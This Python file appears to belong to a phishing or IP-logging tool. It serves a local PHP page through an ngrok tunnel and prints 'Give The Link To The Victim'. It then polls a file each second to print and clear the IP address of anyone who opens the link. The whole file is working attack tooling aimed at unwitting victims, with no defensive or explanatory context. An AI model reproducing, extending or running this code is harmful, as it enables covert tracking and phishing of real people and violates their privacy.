### Importing Modules ###
from pyngrok import ngrok
from subprocess import Popen
from colorama import Fore
import time
import os



###### 01 Empty ######
def Empty():
    
    ### Title ###
    print("\n"+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"@"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" Empty :")
    print("\n"+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"$"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" Loading...", end="")



    ### Starting ###
    with open("log/server.txt", "w") as phplog:
        Popen(("php","-S","localhost:6060","-t","modules/index/07/"),stderr=phplog,stdout=phplog)
        Link = ngrok.connect(6060, "http")
        print("\b"*11+Fore.LIGHTCYAN_EX+" Link |", str(Link).replace("nel: \"http:","nel: \"https:"))
        print("\n"+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"!"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" Give The Link To The Victim\n")



        ### Internet Protocol ###
        def IP():
            FS = 0
            if not int(os.stat('modules/index/07/ip_data.txt').st_size) == int(FS):
                ip_file = open('modules/index/07/ip_data.txt', 'r')
                ip = ip_file.read()
                ip_file.close()
                print(Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"!"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" IP Found!\n")
                print(Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"~"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" IP : "+ip+"\n")
                ip_clear = open('modules/index/07/ip_data.txt', 'w')
                ip_clear.write('')
                ip_clear.close()



        ### Checking ###
        while True:
            IP();
            time.sleep(1)